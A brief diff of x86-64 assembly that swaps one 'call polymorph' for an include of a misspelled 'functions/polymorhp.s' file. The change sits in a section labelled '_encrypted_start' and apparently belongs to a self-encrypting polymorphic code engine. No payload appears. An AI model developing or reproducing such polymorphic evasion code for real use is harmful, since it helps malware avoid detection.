@@ -49,7 +49,10 @@ _encrypted_start:
 	add		rdx, mydata.templates_rdi
 	mov		r8, 7
 	mov		r9, 4
-	call	polymorph
+
+	%include "functions/polymorhp.s"
+
+
 	mov		rdx, [rbp + 16]
 	add		rdx, mydata.templates_rax
 	call	polymorph
